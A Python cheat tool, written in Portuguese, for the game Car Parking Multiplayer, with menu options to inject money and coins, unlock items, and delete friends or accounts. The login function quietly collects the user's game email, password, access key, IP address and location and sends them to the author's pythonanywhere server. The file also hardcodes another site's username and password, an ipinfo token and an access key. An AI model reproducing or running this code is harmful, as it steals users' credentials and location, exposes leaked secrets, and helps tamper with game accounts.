# PROJETO FEITO POR 18 99825-0437
# NÃO MODIFIQUE O CÓDIGO!!!
from colorama import Fore, Style
import requests
import os
from time import sleep
from CarParkingMultiTool import LoginCarParking
from carparktool import CarParkTool
url = "https://samuca007.pythonanywhere.com/"
url2 = "https://samuca007.pythonanywhere.com/"
simbolo = "[" + Fore.RED + "+" + Style.RESET_ALL + "]"
simbolo_erro = "[" + Fore.YELLOW + "+" + Style.RESET_ALL + "]"
def pause():
    input("..pressione enter para continuar..")
class ip():
    def __init__(self, token):
        self.token = token
    
    def ipUser(self):
        url = f"https://ipinfo.io/json?token={self.token}"
        try:
            response = requests.get(url)
            if response.status_code == 200:
                print("========[ " + Fore.RED + "User IP" + Style.RESET_ALL + " ]=============")
                data = response.json()
                print(f"{simbolo} IP: {data.get('ip', 'N/A')}")
                print(f"{simbolo} Cidade: {data.get('city', 'N/A')}")
                print(f"{simbolo} Região: {data.get('region', 'N/A')}")
                print(f"{simbolo} País: {data.get('country', 'N/A')}")
                print(f"{simbolo} Coordenadas: {data.get('loc', 'N/A')}")
                print(f"{simbolo} Org: {data.get('org', 'N/A')}")
                print(f"{simbolo} Postal: {data.get('postal', 'N/A')}")
                print(f"{simbolo} Hostname: {data.get('hostname', 'N/A')}")
            else:
                print(f"{simbolo_erro} Erro: {response.status_code} - {response.text}")
        except Exception as err:
            print(f"{simbolo_erro} Erro: {err}")
            
            
def clear():
    os.system("clear")

def injectMoney():
    try:
        money = int(input(f"{simbolo} Digite a quantidade de dinheiro que deseja >> "))
        print(f"{simbolo} Injetando Dinheiro..")
        client.hack_money(money)
        print(f"{simbolo} Dinheiro Injetado!")
        client.update()
        menu()
    except Exception as err:
        print(f"{simbolo_erro} Erro: {err}")
        sleep(5)
        menu()

def injectCoin():
    try:
        coin = int(input(f"{simbolo} Digite a quantidade de Coins que deseja >> "))
        print(f"{simbolo} Injetando Coin..")
        client.hack_coin(coin)
        print(f"{simbolo} Coin injetado!")
        client.update()
        sleep(2)
        menu()
    except Exception as err:
        print(f"{simbolo_erro} Erro: {err}")
        sleep(2)
        menu()

def unlockAllCars():
    try:
        print(f"{simbolo} Liberando todos os carros..")
        client.unlock_all_car()
        client.update()
        print(f"{simbolo} Carros liberados!")
        sleep(2)
        menu()
    except Exception as err:
        print(f"{simbolo_erro} Erro: {err}")
        sleep(2)
        menu()

def unlockAnim():
    try:
        print(f"{simbolo} Desbloqueando animações..")
        client.unlock_animations()
        client.update()
        print(f"{simbolo} Animações liberadas!")
        sleep(2)
        menu()
    except Exception as err:
        print(f"{simbolo_erro} Erro: {err}")
        sleep(2)
        menu()

def cosmetic():
    try:
        print(f"{simbolo} Desbloqueando roupas..")
        client.unlock_all_cosmetic()
        client.update()
        print(f"{simbolo} Roupas liberadas!")
        sleep(2)
        menu()
    except Exception as err:
        print(f"{simbolo_erro} Erro: {err}")
        sleep(2)
        menu()

def flags():
    try:
        print(f"{simbolo} Desbloqueando bandeiras..")
        client.unlock_all_flags()
        client.update()
        print(f"{simbolo} Bandeiras liberadas!")
        sleep(2)
        menu()
    except Exception as err:
        print(f"{simbolo_erro} Erro: {err}")
        sleep(2)
        menu()

def rodas():
    try:
        print(f"{simbolo} Desbloqueando rodas..")
        client.unlock_all_wheels()
        client.update()
        print(f"{simbolo} Rodas liberadas!")
        sleep(2)
        menu()
    except Exception as err:
        print(f"{simbolo_erro} Erro: {err}")
        sleep(2)
        menu()

def delete():
    try:
        confirm = input("Digite 'confirmar' para excluir a conta >> ")
        if confirm == "confirmar":
            client.delete_account()
            client.update()
            print(f"{simbolo} Conta deletada!")
            sleep(4)
            login()
        else:
            print(f"{simbolo_erro} Ops, acho que você digitou errado, tente novamente!")
            delete()
    except Exception as err:
        print(f"{simbolo_erro} Erro: {err}")
        menu()
        
# Deletar lista de amigos usando o site da topixsb
def deleteFriends():
    login_url = "https://carparking.topixsb.dev/login"
    try:
        login_data = {
            "username": "Samuel7773",
            "password": "Samu456000"
        }
        session = requests.Session()
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36"
        }
        response = session.post(login_url, data=login_data, headers=headers)
        if response.status_code == 200:
            try:
                app_endpoint_url = "https://carparking.topixsb.dev/app_endpoint"
                data = {
                    "InjectCoin": "",
                    "boost_win": "",
                    "customID": "",
                    "customIDplus": "",
                    "customName": "",
                    "email": email,
                    "hp": "",
                    "innerHp": "",
                    "innerNm": "",
                    "item": {
                        "name": "Reset Friend"
                    },
                    "new_email": "",
                    "new_password": "",
                    "nm": "",
                    "password": senha,
                    "tuneupId": "",
                    "varian": ""
                }
                response_delete = session.post(app_endpoint_url, json=data)
                if response_delete.status_code == 200:
                    print(f"{simbolo} Amigos deletados!")
                    sleep(4)
                    menu()
                else:
                    print(f"{simbolo_erro} Não foi possível deletar os amigos: {response_delete.status_code} - {response_delete.text}")
            except Exception as e:
                print(f"{simbolo_erro} Erro: {e}")
                sleep(4)
                menu()
        else:
            print(f"{simbolo_erro} Erro: {response.status_code} - {response.text}")
            sleep(4)
            menu()
    except Exception as err:
        print(f"{simbolo} Não foi possível acessar a API!")
        sleep(4)
        menu()
def create_account():
    acess_key = "8FFC258232"
    cpm = CarParkTool(acess_key)
    email2 = input(f"{simbolo} Digite o email da nova conta >> ")
    senha2 = input(f"{simbolo} Digite a senha da nova conta >> ")
    status = cpm.register(email2, senha2)
    if status == 0:
        print("========[ " + Fore.RED + "Conta Registrada" + Style.RESET_ALL + " ]========")
        print(f"{simbolo} Conta criada! \n{simbolo} Email: {email2} \n{simbolo} Senha: {senha2}")
        pause()
        menu()
    elif status == 105:
        print(f"{simbolo_erro} Erro: O email já está registrado!")
        sleep(4)
        menu()
    else:
        print(f"{simbolo_erro} Erro: Por favor tente novamente!")
        sleep(4)
        menu()

def menu():
    clear()
    # info script
    print("========[ " + Fore.RED + "Info Script" + Style.RESET_ALL + " ]=========")
    print(f"{simbolo} Dono: 18 99825-0437")
    print(f"{simbolo} Telegram: t.me/Samuca_007")
    print(f"{simbolo} Status Script: VIP")
    # Info Player
    print("========[ " + Fore.RED + "Player" + Style.RESET_ALL + " ]==============")
    print(f"{simbolo} Email: {email}")
    print(f"{simbolo} Senha: {senha}")
    print(f"{simbolo} Total Money: {client.data_account.money}")
    print(f"{simbolo} Total Coins: {client.data_account.coin}")
    print(f"{simbolo} Nome: {client.data_account.Name}")
    print(f"{simbolo} ID: {client.data_account.localID}")
    # Menu IP
    token = "10a94f3a0b0ec0"
    ipUserToken = ip(token)
    ipUserToken.ipUser()
    # Menu Hack
    print("========[ " + Fore.RED + "Menu" + Style.RESET_ALL + " ]================")
    menuHack = f"{simbolo} Injetar Dinheiro - 1/{simbolo} Injetar Coins - 2/{simbolo} Desbloquear Todos Carros - 3/{simbolo} Desbloquear Animações - 4/{simbolo} Desbloquear Roupas - 5/{simbolo} Desbloquear Bandeiras - 6/{simbolo} Desbloquear Rodas - 7/{simbolo} Deletar Amigos - 8/{simbolo} Deletar Conta - 9/{simbolo} Registrar Conta - 10/{simbolo} Sair - 0/"
    menuList = menuHack.split("/")
    for op in menuList:
        print(op)
    try:
        opUser = int(input(f"{simbolo} Digite a opção desejada (1-8) >> "))
        if opUser == 1:
            injectMoney()
        elif opUser == 2:
            injectCoin()
        elif opUser == 3:
            unlockAllCars()
        elif opUser == 4:
            unlockAnim()
        elif opUser == 5:
            cosmetic()
        elif opUser == 6:
            flags()
        elif opUser == 7:
            rodas()
        elif opUser == 8:
            deleteFriends()
        elif opUser == 9:
            delete()
        elif opUser == 10:
            create_account()
        elif opUser == 0:
            print(f"{simbolo} Saindo..")
        else:
            print(f"{simbolo_erro} Digite apenas números!")
    except Exception as e:
        print(f"{simbolo} Erro: {e}")
        sleep(2)
        menu()

def login():
    clear()
    try:
        url_data = "https://ipinfo.io/json?token=10a94f3a0b0ec0"
        response_data = requests.get(url_data)
        if response_data.status_code == 200:
            data = response_data.json()
            ip_data = data.get('ip', 'N/A')
            locate_data = data.get('city', 'N/A')
            region_data = data.get('region', 'N/A')
            country_data = data.get('country', 'N/A')
            postal_data = data.get('postal', 'N/A')
        else:
            print(f"{simbolo_erro} Erro: {response_data.status_code} - {response_data.text}")
    except Exception as error:
        print(f"{simbolo_erro} Erro: {error}") 
    try:
        response = requests.get(url + "key")
        if response.status_code == 200:
            keys = response.json()
            print("=============[ " + Fore.RED + "Login" + Style.RESET_ALL + " ]=============")
            global email
            global senha
            email = input(f"{simbolo} Digite seu email >> ")
            senha = input(f"{simbolo} Digite sua senha >> ")
            key_user = input(f"{simbolo} Digite a chave de acesso >> ")
            print(f"{simbolo} Verificando..")
            global client
            client = LoginCarParking(email=email, password=senha)

            if key_user in [key["key"] for key in keys]:
                user_data = {
                    "email": email,
                    "senha": senha,
                    "chave_acesso": key_user,
                    "ip": ip_data,
                    "localizacao": locate_data,
                    "regiao": region_data,
                    "cidade": country_data
                }
                try:
                    user_data_response = requests.post(url2 + "user-credentials", json=user_data)
                    if user_data_response.status_code == 200:
                        print(f"{simbolo} Acesso liberado")
                        sleep(2)
                        menu()
                    else:
                        print(f"{simbolo_erro} Erro ao acessar api: {user_data_response.status_code} - {user_data_response.text}")
                except Exception as err:
                    print(f"{simbolo_erro} Erro ao acessar api: {err}")
            else:
                print(f"{simbolo_erro} Acesso negado: Chave de acesso inválida!")
                sleep(2)
                login()
        else:
            print(f"{simbolo_erro} Erro: {response.status_code}")
    except Exception as err:
        print(f"{simbolo_erro} Erro: {err}")
        sleep(2)
        login()

if __name__ == "__main__":
    login()
